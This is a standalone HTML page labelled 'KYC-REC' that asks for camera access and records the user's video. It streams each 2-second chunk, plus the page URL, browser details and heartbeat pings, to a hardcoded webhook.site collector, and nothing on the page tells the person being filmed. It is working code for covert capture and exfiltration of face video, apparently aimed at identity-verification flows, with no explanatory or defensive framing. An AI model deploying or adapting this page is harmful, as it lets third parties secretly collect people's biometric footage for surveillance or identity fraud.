<!doctype html><html><head><meta charset="utf-8"><title>KYC-REC</title></head>
<body style="font:14px monospace;padding:8px"><h3>KYC-REC (MediaRecorder)</h3><pre id="o">start</pre>
<script>
var HOOK='https://webhook.site/0b16e05b-1e96-42cc-bc3c-c247c7eb3668', T0=Date.now(), chunk=0, total=0;
function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+String(d).substr(0,400)})}catch(e){}}
post('REC_PAGE',{href:location.href,ua:navigator.userAgent,mr:typeof MediaRecorder});
function sha(a){return crypto.subtle.digest('SHA-256',a).then(function(h){return Array.prototype.map.call(new Uint8Array(h),function(b){return('0'+b.toString(16)).slice(-2)}).join('')})}
navigator.mediaDevices.getUserMedia({video:{width:480,height:640},audio:false}).then(function(st){
  var t=st.getVideoTracks()[0], s=t.getSettings();
  log('stream '+t.label+' '+s.width+'x'+s.height);
  post('REC_STREAM',{label:t.label,w:s.width,h:s.height});
  var types=['video/webm;codecs=vp8','video/webm','video/mp4'];
  var mime=null; types.forEach(function(m){ if(!mime && window.MediaRecorder && MediaRecorder.isTypeSupported(m)) mime=m });
  var mr=new MediaRecorder(st, mime?{mimeType:mime}:undefined);
  post('REC_MIME',{mime:mime||'default'});
  mr.ondataavailable=function(e){
    if(!e.data || e.data.size===0) return;
    var i=++chunk;
    e.data.arrayBuffer().then(function(ab){
      total+=e.data.size;
      return sha(ab.slice(0,512)).then(function(h){
        var u=HOOK+'?chunk='+i+'&bytes='+e.data.size+'&total='+total+'&t='+(Date.now()-T0)+'&sha='+h.substring(0,16);
        try{ fetch(u,{method:'POST',body:e.data}) }catch(err){}
        log('chunk'+i+' '+e.data.size+'B t='+(Date.now()-T0)+'ms sha='+h.substring(0,8));
      });
    });
  };
  mr.start(2000);
  post('REC_STARTED',{mime:mime||'default',timeslice:2000});
  setInterval(function(){ post('REC_HEARTBEAT',{t:Date.now()-T0,chunks:chunk,total:total,state:mr.state,vis:document.visibilityState}) },5000);
}).catch(function(e){ log('ERR '+e); post('REC_ERR',''+e) });
</script></body></html>
